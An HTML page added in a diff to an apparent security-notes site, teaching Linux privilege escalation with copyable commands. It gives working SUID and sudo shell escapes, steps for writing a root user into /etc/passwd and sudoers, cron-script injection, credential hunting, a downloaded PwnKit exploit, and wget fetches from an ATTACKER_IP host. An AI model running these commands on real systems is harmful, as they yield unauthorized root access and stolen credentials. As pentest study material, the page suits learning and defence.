@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en" style="background-color:#020202">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux PrivEsc Basics - Security Hub</title>
+    <meta name="description"
+        content="Linux Privilege Escalation — enumeration, SUID, sudo abuse, writable paths, cron jobs, and tools.">
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <link rel="stylesheet" href="../css/style.css">
+    <style>
+        .danger-box {
+            background: rgba(239, 68, 68, .06);
+            border: 1px solid rgba(239, 68, 68, .2);
+            border-radius: 10px;
+            padding: 1rem 1.2rem;
+            margin: .75rem 0;
+            display: flex;
+            gap: .75rem;
+            align-items: flex-start
+        }
+
+        .danger-box i {
+            color: #ef4444;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+            margin-top: 2px
+        }
+
+        .danger-box p {
+            font-size: .875rem;
+            color: var(--text-soft);
+            margin: 0;
+            line-height: 1.55
+        }
+
+        .tip-box {
+            background: rgba(16, 185, 129, .06);
+            border: 1px solid rgba(16, 185, 129, .2);
+            border-radius: 10px;
+            padding: 1rem 1.2rem;
+            margin: .75rem 0;
+            display: flex;
+            gap: .75rem;
+            align-items: flex-start
+        }
+
+        .tip-box i {
+            color: #10b981;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+            margin-top: 2px
+        }
+
+        .tip-box p {
+            font-size: .875rem;
+            color: var(--text-soft);
+            margin: 0;
+            line-height: 1.55
+        }
+
+        .vec-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem
+        }
+
+        .vec-card {
+            background: var(--bg-surface-hover);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.2rem;
+            border-left: 3px solid transparent;
+            transition: all .25s
+        }
+
+        .vec-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, .4)
+        }
+
+        .vec-card i {
+            font-size: 1.4rem;
+            margin-bottom: .55rem;
+            display: block
+        }
+
+        .vec-card h3 {
+            font-family: 'Outfit', sans-serif;
+            font-size: .9rem;
+            font-weight: 600;
+            margin: 0 0 .3rem
+        }
+
+        .vec-card p {
+            font-size: .79rem;
+            color: var(--text-soft);
+            margin: 0;
+            line-height: 1.5
+        }
+    </style>
+    <script>if (localStorage.getItem('theme') === 'light-mode') document.documentElement.classList.add('light-mode');</script>
+</head>
+
+<body>
+    <button class="mobile-toggle" id="mobile-toggle"><i class="ph-list"></i></button>
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <h2><i class="ph-shield-warning"></i> SecNotes</h2>
+        </div>
+        <nav class="sidebar-nav">
+            <div class="nav-section">
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../index.html"><i class="ph-house"></i> Home Dashboard</a></li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">linux</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../linux/index.html"><i class="ph-linux-logo"></i> Linux Overview</a>
+                    </li>
+                    <li class="nav-item"><a href="../linux/file-permissions.html"><i class="ph-key"></i> File
+                            Permissions</a></li>
+                    <li class="nav-item"><a href="../linux/processes.html"><i class="ph-cpu"></i> Processes</a></li>
+                    <li class="nav-item"><a href="../linux/package-management.html"><i class="ph-package"></i> Package
+                            Management</a></li>
+                    <li class="nav-item"><a href="../linux/networking-commands.html"><i class="ph-wifi-high"></i>
+                            Networking Commands</a></li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">networking</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../networking/index.html"><i class="ph-globe-hemisphere-west"></i>
+                            Networking Overview</a></li>
+                    <li class="nav-item"><a href="../networking/osi-model.html"><i class="ph-stack"></i> OSI Model</a>
+                    </li>
+                    <li class="nav-item"><a href="../networking/tcp-ip.html"><i class="ph-share-network"></i> TCP/IP</a>
+                    </li>
+                    <li class="nav-item"><a href="../networking/dns.html"><i class="ph-book-bookmark"></i> DNS</a></li>
+                    <li class="nav-item"><a href="../networking/http-https.html"><i class="ph-lock-key"></i>
+                            HTTP/HTTPS</a></li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">web security</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../web-security/index.html"><i class="ph-shield-check"></i> Web
+                            Security</a></li>
+                    <li class="nav-item"><a href="../web-security/sqli.html"><i class="ph-database"></i> SQL
+                            Injection</a></li>
+                    <li class="nav-item"><a href="../web-security/xss.html"><i class="ph-browser"></i> XSS</a></li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">privilege escalation</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../privilege-escalation/index.html"><i class="ph-trend-up"></i>
+                            Privilege Escalation</a></li>
+                    <li class="nav-item"><a href="../privilege-escalation/linux-privesc-basics.html" class="active"><i
+                                class="ph-ladder"></i> Linux PrivEsc Basics</a></li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">tools</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../tools/index.html"><i class="ph-toolbox"></i> Tools Overview</a>
+                    </li>
+                    <li class="nav-item"><a href="../tools/nmap.html"><i class="ph-radar"></i> Nmap</a></li>
+                    <li class="nav-item"><a href="../tools/wireshark.html"><i class="ph-wave-sine"></i> Wireshark</a>
+                    </li>
+                    <li class="nav-item"><a href="../tools/burpsuite.html"><i class="ph-spider"></i> Burp Suite</a></li>
+                    <li class="nav-item"><a href="../tools/metasploit.html"><i class="ph-skull"></i> Metasploit</a></li>
+                </ul>
+            </div>
+            <div class="theme-toggle-wrapper"><button id="theme-toggle" class="theme-toggle"><i class="ph-sun"></i>
+                    Light Mode</button></div>
+        </nav>
+    </aside>
+    <div class="main-wrapper">
+        <main class="content">
+            <div class="content-header">
+                <div class="breadcrumb"><i class="ph-folder-open"></i> Privilege Escalation <i
+                        class="ph-caret-right"></i> Linux PrivEsc Basics</div>
+                <h1>Linux Privilege Escalation</h1>
+                <p>The art of moving from a low-privilege shell to <strong>root</strong>. After gaining initial access,
+                    PrivEsc is almost always the next step. Linux systems are rich with misconfigurations — this guide
+                    covers the most common and reliable vectors.</p>
+            </div>
+
+            <!-- Overview -->
+            <div class="card">
+                <h2><i class="ph-info"></i> The Mindset</h2>
+                <p>Privilege escalation is about finding what is <strong>misconfigured, over-permissioned, or
+                        vulnerable</strong> on the system. There is no single magic command — you must <em>enumerate
+                        thoroughly first</em>, then attack the most promising vector.</p>
+                <div class="vec-grid">
+                    <div class="vec-card" style="border-left-color:#ef4444">
+                        <i class="ph-list-magnifying-glass" style="color:#f87171;"></i>
+                        <h3>1. Enumerate Everything</h3>
+                        <p>System info, users, SUID bits, sudo rules, running processes, cron jobs, writable files,
+                            network services, passwords in files.</p>
+                    </div>
+                    <div class="vec-card" style="border-left-color:#f59e0b">
+                        <i class="ph-magnifying-glass" style="color:#fbbf24;"></i>
+                        <h3>2. Find the Weakness</h3>
+                        <p>A misset SUID binary, a sudo rule that allows a dangerous command, a cron job running as root
+                            with a writable script.</p>
+                    </div>
+                    <div class="vec-card" style="border-left-color:#8b5cf6">
+                        <i class="ph-trend-up" style="color:#a78bfa;"></i>
+                        <h3>3. Exploit &amp; Escalate</h3>
+                        <p>Use GTFOBins, craft a payload, or exploit a kernel vulnerability to gain a root shell or
+                            write to <code class="inline">/etc/passwd</code>/<code class="inline">sudoers</code>.</p>
+                    </div>
+                    <div class="vec-card" style="border-left-color:#10b981">
+                        <i class="ph-check-circle" style="color:#34d399;"></i>
+                        <h3>4. Verify Root</h3>
+                        <p>Confirm with <code class="inline">id</code>, <code class="inline">whoami</code>, <code
+                                class="inline">cat /root/root.txt</code>, or <code class="inline">sudo -i</code> on the
+                            escalated shell.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Initial Enumeration -->
+            <div class="card">
+                <h2><i class="ph-list-magnifying-glass"></i> Initial Enumeration Commands</h2>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">bash — System Recon</span><button class="copy-btn"
+                            onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># WHO AM I + system info
+id                              # current user, uid, groups
+whoami
+uname -a                        # kernel version — check for kernel exploits
+uname -r
+cat /proc/version
+cat /etc/os-release             # distro + version
+hostname
+
+# USERS
+cat /etc/passwd                 # all user accounts
+cat /etc/shadow                 # password hashes (if readable)
+cat /etc/group                  # groups
+who                             # who is logged in
+w
+last                            # login history
+
+# SUDO
+sudo -l                         # what can current user run as sudo?
+sudo -V                         # sudo version — check for CVEs
+
+# ENVIRONMENT
+env                             # environment variables
+echo $PATH
+history                         # bash history — may contain passwords
+cat ~/.bash_history
+cat ~/.zsh_history</code></pre>
+                </div>
+            </div>
+
+            <!-- SUID -->
+            <div class="card">
+                <h2><i class="ph-key"></i> SUID / SGID Binaries</h2>
+                <p>SUID (Set User ID) binaries run with the <strong>file owner's privileges</strong>, not the caller's.
+                    If root owns an SUID binary and it can be abused, you get root. Common misconfigurations include
+                    <code class="inline">find</code>, <code class="inline">vim</code>, <code
+                        class="inline">python</code>, <code class="inline">nmap</code> (old versions), <code
+                        class="inline">cp</code>, <code class="inline">bash</code>.</p>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">bash — SUID Enumeration &amp;
+                            Exploitation</span><button class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i>
+                            Copy</button></div>
+                    <pre><code># Find all SUID binaries
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null   # equivalent
+
+# Find SGID binaries (runs as group owner)
+find / -perm -g=s -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+
+# Find both SUID and SGID
+find / -perm -6000 -type f 2>/dev/null
+
+# Common exploitable SUID binaries (check GTFOBins for each):
+# /bin/bash     /usr/bin/find   /usr/bin/vim   /usr/bin/python
+# /usr/bin/nmap /usr/bin/cp     /bin/nano       /usr/bin/perl
+
+# EXPLOITATION EXAMPLES (via GTFOBins):
+
+# bash with SUID
+/bin/bash -p                    # -p preserves effective UID (euid = root)
+
+# find with SUID
+./find . -exec /bin/sh -p \; -quit
+
+# vim with SUID
+./vim -c ':!/bin/sh'            # opens root shell from inside vim
+
+# python with SUID
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# nmap (old versions) with SUID
+echo "os.execute('/bin/sh')" > /tmp/shell.nse
+./nmap --script=/tmp/shell.nse
+
+# cp with SUID — add root user to /etc/passwd
+echo "hacked:$(openssl passwd hacked):0:0:root:/root:/bin/bash" > /tmp/newroot
+./cp /tmp/newroot /etc/passwd
+su hacked                        # password: hacked</code></pre>
+                </div>
+                <div class="tip-box"><i class="ph-lightbulb"></i>
+                    <p>Always check <strong>GTFOBins</strong> (<a href="https://gtfobins.github.io" target="_blank"
+                            style="color:var(--accent-primary);">gtfobins.github.io</a>) — it documents exactly how to
+                        abuse common Unix binaries for SUID, sudo, and shell escapes.</p>
+                </div>
+            </div>
+
+            <!-- Sudo Abuse -->
+            <div class="card">
+                <h2><i class="ph-user-switch"></i> Sudo Misconfigurations</h2>
+                <p>Always run <code class="inline">sudo -l</code> immediately after getting a shell. Misconfigurations
+                    here are one of the most common and reliable PrivEsc vectors.</p>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">bash — Sudo Exploitation</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># Check what current user can run with sudo
+sudo -l
+# Example output:
+# (ALL) NOPASSWD: /usr/bin/vim
+# (root) /usr/bin/python3 /opt/script.py
+
+# If user can run everything as root:
+(ALL : ALL) ALL   →   sudo su, sudo bash, sudo -i
+
+# Common sudo exploitation (GTFOBins):
+
+# sudo vim
+sudo vim -c ':!/bin/bash'
+
+# sudo python3
+sudo python3 -c 'import os; os.system("/bin/bash")'
+
+# sudo find
+sudo find . -exec /bin/bash \; -quit
+
+# sudo nano  -- drop to shell inside nano
+sudo nano
+# Press Ctrl+R then Ctrl+X → type: reset; sh 1>&0 2>&0
+
+# sudo less / man  -- shell escape
+sudo less /etc/hosts → press !bash
+
+# sudo awk
+sudo awk 'BEGIN {system("/bin/bash")}'
+
+# sudo env / sudo -s  -- run shell as root
+sudo env /bin/bash
+sudo -s
+
+# sudo cat  -- read sensitive files
+sudo cat /etc/shadow
+sudo cat /root/root.txt
+
+# Writable script executed by sudo
+# If (root) NOPASSWD: /usr/bin/python3 /opt/script.py
+# AND /opt/script.py is writable by current user:
+echo 'import os; os.system("chmod +s /bin/bash")' >> /opt/script.py
+sudo /usr/bin/python3 /opt/script.py
+/bin/bash -p</code></pre>
+                </div>
+            </div>
+
+            <!-- Cron Jobs -->
+            <div class="card">
+                <h2><i class="ph-clock"></i> Cron Job Abuse</h2>
+                <p>Cron jobs run automatically on a schedule. If a cron job runs a script as <strong>root</strong> and
+                    that script is <strong>writable by you</strong>, you can inject malicious commands that run as root.
+                </p>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">bash — Cron Enumeration &amp;
+                            Exploitation</span><button class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i>
+                            Copy</button></div>
+                    <pre><code># List cron jobs (various locations)
+crontab -l                         # current user's crons
+sudo crontab -l                    # root's crons
+cat /etc/crontab                   # system-wide crons
+ls -la /etc/cron*                  # cron.d, cron.hourly, etc.
+cat /etc/cron.d/*
+cat /var/spool/cron/crontabs/*
+
+# View running processes to catch cron execution
+watch -n 1 "ps aux | grep --color cron"
+
+# Use pspy to monitor processes without root
+./pspy64                            # lists processes incl. cron jobs as they run
+
+# Exploit: writable cron script
+# If /opt/cleanup.sh runs as root every minute and is writable:
+echo 'chmod +s /bin/bash' >> /opt/cleanup.sh
+# Wait for cron to run...
+bash -p                             # get root shell
+
+# Exploit: writable PATH in crontab
+# Crontab: PATH=/home/user:/usr/local/sbin
+# Script calls "curl" without full path — you put malicious curl in /home/user:
+echo '#!/bin/bash\nchmod +s /bin/bash' > /home/user/curl
+chmod +x /home/user/curl
+# Wait for cron, then: bash -p</code></pre>
+                </div>
+            </div>
+
+            <!-- Writable Files -->
+            <div class="card">
+                <h2><i class="ph-pencil-simple"></i> Writable Files &amp; Paths</h2>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">bash — Writable File Hunting</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># World-writable files
+find / -writable -type f 2>/dev/null | grep -v proc
+
+# World-writable directories
+find / -writable -type d 2>/dev/null
+
+# Check /etc/passwd write permission (critical misconfiguration)
+ls -la /etc/passwd
+# If writable: add a root user manually
+echo 'r00t:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd
+su r00t
+
+# Check /etc/sudoers
+ls -la /etc/sudoers
+# If writable: add yourself to sudoers
+echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+sudo bash
+
+# Find files owned by root but writable by all
+find / -user root -perm -002 -type f 2>/dev/null</code></pre>
+                </div>
+            </div>
+
+            <!-- Credentials Hunting -->
+            <div class="card">
+                <h2><i class="ph-magnifying-glass"></i> Credential &amp; Secret Hunting</h2>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">bash — Find Passwords &amp; Keys</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># Search for passwords in files
+grep -ria "password" /var/www/ 2>/dev/null
+grep -ria "passwd" /etc/ 2>/dev/null
+grep -rn "password" /home/ 2>/dev/null
+find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
+
+# Common config files with credentials
+cat /var/www/html/config.php
+cat /var/www/html/wp-config.php         # WordPress DB creds
+cat /etc/phpmyadmin/config.inc.php
+cat ~/.ssh/id_rsa                        # private SSH key
+find / -name "id_rsa" 2>/dev/null
+find / -name "*.key" 2>/dev/null
+find / -name "*.pem" 2>/dev/null
+
+# Database credential files
+cat /var/lib/mysql/.my.cnf
+cat /root/.my.cnf
+find / -name "*.db" 2>/dev/null
+find / -name "*.sqlite" 2>/dev/null
+
+# History files
+cat ~/.bash_history
+cat ~/.zsh_history
+cat ~/.mysql_history
+cat ~/.psql_history</code></pre>
+                </div>
+            </div>
+
+            <!-- Kernel Exploits -->
+            <div class="card">
+                <h2><i class="ph-bug"></i> Kernel Exploits</h2>
+                <p>When nothing else works, check if the kernel version has a known public exploit. These are noisy and
+                    can crash systems — use as a last resort.</p>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">bash — Kernel Exploit Recon</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># Get kernel version
+uname -r              # example: 3.13.0-24-generic
+uname -a
+
+# Search for exploits
+searchsploit linux kernel 3.13  # search Exploit-DB locally
+searchsploit linux local privilege escalation
+
+# Famous kernel exploits:
+# - DirtyCow (CVE-2016-5195)    Linux 2.6.22 - 4.8.3
+# - PTRACE_TRACEME (CVE-2019-13272)  Linux < 5.1.17
+# - PwnKit (CVE-2021-4034)      pkexec privilege escalation ALL Linux
+# - DirtyPipe (CVE-2022-0847)   Linux 5.8 - 5.16.11
+
+# DirtyCow compile + run
+gcc -pthread dirtycow.c -o dirtycow -lcrypt
+./dirtycow /etc/passwd newpasswd
+
+# PwnKit — instant root on almost all Linux systems
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
+chmod +x PwnKit && ./PwnKit</code></pre>
+                </div>
+                <div class="danger-box"><i class="ph-warning-circle"></i>
+                    <p><strong>Warning:</strong> Kernel exploits can crash the target system. Always attempt other
+                        vectors first. Never run untested exploits on production systems.</p>
+                </div>
+            </div>
+
+            <!-- Automated Tools -->
+            <div class="card">
+                <h2><i class="ph-robot"></i> Automated Enumeration Tools</h2>
+                <p>These scripts automate the enumeration process and highlight potential vectors — save hours of manual
+                    work:</p>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">bash — PrivEsc Automation Tools</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># LinPEAS — most comprehensive Linux PrivEsc script
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# OR transfer to target:
+wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas_output.txt
+
+# LinEnum — classic thorough enumeration script
+wget http://ATTACKER_IP:8000/LinEnum.sh -O /tmp/LinEnum.sh
+chmod +x /tmp/LinEnum.sh && /tmp/LinEnum.sh -t 2>&1 | tee /tmp/linenum.txt
+
+# linux-exploit-suggester — match kernel to known exploits
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
+
+# pspy — monitor processes without root (find cron jobs)
+wget http://ATTACKER_IP:8000/pspy64 -O /tmp/pspy64
+chmod +x /tmp/pspy64 && /tmp/pspy64
+
+# Serve files from your attacker machine
+python3 -m http.server 8000          # run on attacker
+# then wget from victim to pull files</code></pre>
+                </div>
+                <div class="tip-box"><i class="ph-lightbulb"></i>
+                    <p><strong>Workflow:</strong> Run LinPEAS first — read the output carefully focusing on
+                        red-highlighted items. Then cross-reference anything suspicious with GTFOBins. Manually verify
+                        before exploiting.</p>
+                </div>
+            </div>
+
+        </main>
+    </div>
+    <script src="../js/script.js"></script>
+</body>
+
+</html>
